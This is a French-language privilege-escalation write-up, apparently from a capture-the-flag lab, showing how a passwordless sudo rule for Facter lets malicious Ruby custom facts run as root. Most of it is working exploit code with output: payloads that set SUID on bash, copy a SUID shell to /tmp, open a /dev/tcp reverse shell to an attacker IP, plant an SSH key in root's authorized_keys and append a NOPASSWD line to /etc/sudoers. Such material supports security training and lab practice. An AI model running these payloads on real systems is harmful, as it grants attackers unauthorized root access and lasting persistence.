# Escalade de Privilèges via Facter (Puppet)

## <mark style="color:red;">Escalade de Privilèges via Facter (Puppet)</mark>

### <mark style="color:blue;">Introduction</mark>

**Facter** est un outil de collecte d'informations système développé par Puppet Labs, utilisé pour récupérer des "facts" (faits) sur un système : CPU, mémoire, disques, réseau, système d'exploitation, etc. Ces informations sont ensuite utilisées par Puppet pour la gestion de configuration automatisée.

Lorsque Facter est exécutable avec `sudo` sans mot de passe, un attaquant peut exploiter la fonctionnalité de **custom facts** (faits personnalisés) pour exécuter du code arbitraire en tant que root.

### <mark style="color:blue;">Architecture de Facter</mark>

#### <mark style="color:green;">Qu'est-ce que Facter ?</mark>

**Facter** = Collecteur d'informations système pour Puppet

**Utilisation normale :**

```bash
$ facter
architecture => x86_64
os => {
  family => "Debian",
  name => "Ubuntu",
  release => {
    full => "25.04",
    major => "25"
  }
}
memory => {
  system => {
    total => "7.76 GiB",
    used => "1.52 GiB"
  }
}
```

**Cas d'usage légitime :**

```ruby
# Dans un manifest Puppet
if $facts['os']['family'] == 'Debian' {
  package { 'apache2':
    ensure => installed,
  }
}
```

#### Custom Facts

Facter permet de créer des **custom facts** via des scripts Ruby ou exécutables :

**Structure d'un custom fact :**

```ruby
# /etc/facter/facts.d/custom_fact.rb
Facter.add(:my_custom_fact) do
  setcode do
    "custom_value"
  end
end
```

**Chargement des custom facts :**

```bash
# Répertoires par défaut
/etc/facter/facts.d/
/etc/puppetlabs/facter/facts.d/
/usr/lib/facter/
/opt/puppetlabs/facter/facts.d/

# Répertoire personnalisé
facter --custom-dir=/path/to/facts
```

***

### <mark style="color:blue;">Vulnérabilité</mark>

#### Le Problème

Quand Facter est exécutable en `sudo` sans mot de passe :

```bash
$ sudo -l
User trivia may run the following commands on facts:
    (ALL) NOPASSWD: /usr/bin/facter
```

**Chaîne d'exploitation :**

```
1. Créer un custom fact malveillant en Ruby
2. Placer le script dans un répertoire accessible en écriture
3. Exécuter : sudo facter --custom-dir=/path/to/malicious
4. Le code s'exécute avec les privilèges root
```

#### Pourquoi C'est Dangereux ?

**Facter exécute le code Ruby des custom facts dans son propre processus :**

```ruby
Facter.add(:pwned) do
  setcode do
    # ⚠️ Ce code s'exécute avec les privilèges de facter
    system("id")  # Si facter tourne en root → commande en root
    "success"
  end
end
```

**Si `sudo facter` est autorisé :**

* Facter s'exécute en tant que root
* Les custom facts s'exécutent dans le contexte de Facter
* **Résultat** : Exécution de code arbitraire en root !

***

### <mark style="color:blue;">Exploitation Pratique</mark>

#### Méthode 1 : SUID sur Bash

**Objectif :** Donner les permissions SUID à `/bin/bash` pour obtenir un shell root

**Étape 1 : Créer le Custom Fact**

```bash
# Créer un répertoire temporaire
mkdir -p /tmp/pwn

# Créer le custom fact malveillant
cat > /tmp/pwn/exploit.rb << 'EOF'
Facter.add(:pwned) do
  setcode do
    # Ajouter le bit SUID sur bash
    system("chmod +s /bin/bash")
    "success"
  end
end
EOF
```

**Explication du code :**

```ruby
Facter.add(:pwned) do              # Créer un fait nommé "pwned"
  setcode do                        # Définir le code à exécuter
    system("chmod +s /bin/bash")    # Commande système en root
    "success"                       # Valeur retournée par le fait
  end
end
```

**Étape 2 : Exécuter avec Sudo**

```bash
# Exécuter facter avec le répertoire personnalisé
sudo /usr/bin/facter --custom-dir=/tmp/pwn
```

**Ce qui se passe :**

1. Facter se lance en tant que root (via sudo)
2. Facter charge le fichier `/tmp/pwn/exploit.rb`
3. Exécute `system("chmod +s /bin/bash")` en tant que root
4. Le bit SUID est ajouté à `/bin/bash`

**Étape 3 : Obtenir un Shell Root**

```bash
# Vérifier les permissions
ls -la /bin/bash
# -rwsr-sr-x 1 root root 1396520 Jan 12  2025 /bin/bash

# Lancer bash avec les privilèges effectifs
/bin/bash -p

# Vérifier
id
# uid=1000(trivia) gid=1000(trivia) euid=0(root) egid=0(root) groups=0(root),1000(trivia)

# Shell root obtenu !
whoami
# root
```

**Note sur `-p` :**

* Sans `-p` : Bash abandonne les privilèges SUID
* Avec `-p` : Bash conserve les privilèges effectifs (euid=0)

#### <mark style="color:green;">Méthode 2 : Copie de Bash avec SUID</mark>

**Objectif :** Créer une copie de bash avec SUID dans `/tmp`

**Étape 1 : Custom Fact**

```bash
cat > /tmp/pwn/exploit.rb << 'EOF'
Facter.add(:pwned) do
  setcode do
    # Copier bash dans /tmp et ajouter SUID
    system("cp /bin/bash /tmp/rootbash")
    system("chmod +s /tmp/rootbash")
    "success"
  end
end
EOF
```

**Étape 2 : Exécution**

```bash
sudo /usr/bin/facter --custom-dir=/tmp/pwn

# Vérifier
ls -la /tmp/rootbash
# -rwsr-sr-x 1 root root 1396520 Feb 02 15:30 /tmp/rootbash
```

**Étape 3 : Shell Root**

```bash
/tmp/rootbash -p

whoami
# root
```

#### <mark style="color:green;">Méthode 3 : Reverse Shell</mark>

**Objectif :** Obtenir un reverse shell root

**Étape 1 : Listener sur l'attaquant**

```bash
# Sur la machine attaquante
nc -lvnp 4444
```

**Étape 2 : Custom Fact**

```bash
cat > /tmp/pwn/exploit.rb << 'EOF'
Facter.add(:pwned) do
  setcode do
    # Reverse shell bash
    system("bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'")
    "success"
  end
end
EOF
```

**Étape 3 : Exécution**

```bash
sudo /usr/bin/facter --custom-dir=/tmp/pwn
```

**Résultat sur le listener :**

```bash
$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.5] from (UNKNOWN) [10.129.23.243] 54892
root@facts:/home/trivia# id
uid=0(root) gid=0(root) groups=0(root)
```

#### <mark style="color:green;">Méthode 4 : Ajout de Clé SSH</mark>

**Objectif :** Ajouter une clé SSH publique dans `/root/.ssh/authorized_keys`

**Étape 1 : Générer une Paire de Clés**

```bash
# Sur la machine attaquante
ssh-keygen -t ed25519 -f /tmp/pwn_key
# Public key : /tmp/pwn_key.pub
# Private key : /tmp/pwn_key
```

**Étape 2 : Custom Fact**

```bash
cat > /tmp/pwn/exploit.rb << 'EOF'
Facter.add(:pwned) do
  setcode do
    # Créer le répertoire .ssh si inexistant
    system("mkdir -p /root/.ssh")
    
    # Ajouter la clé publique
    system("echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIxxxxxxxxxxxxxxxxxxxxxxxxxxxxx attacker@kali' >> /root/.ssh/authorized_keys")
    
    # Permissions correctes
    system("chmod 600 /root/.ssh/authorized_keys")
    system("chmod 700 /root/.ssh")
    
    "success"
  end
end
EOF
```

**Étape 3 : Exécution et Connexion**

```bash
# Exécuter le custom fact
sudo /usr/bin/facter --custom-dir=/tmp/pwn

# Connexion SSH en tant que root
ssh -i /tmp/pwn_key root@target.com
```

#### <mark style="color:green;">Méthode 5 : Modification de /etc/sudoers</mark>

**Objectif :** Ajouter `trivia ALL=(ALL) NOPASSWD: ALL` dans `/etc/sudoers`

**Custom Fact**

```bash
cat > /tmp/pwn/exploit.rb << 'EOF'
Facter.add(:pwned) do
  setcode do
    # Ajouter une ligne dans sudoers
    system("echo 'trivia ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers")
    "success"
  end
end
EOF
```
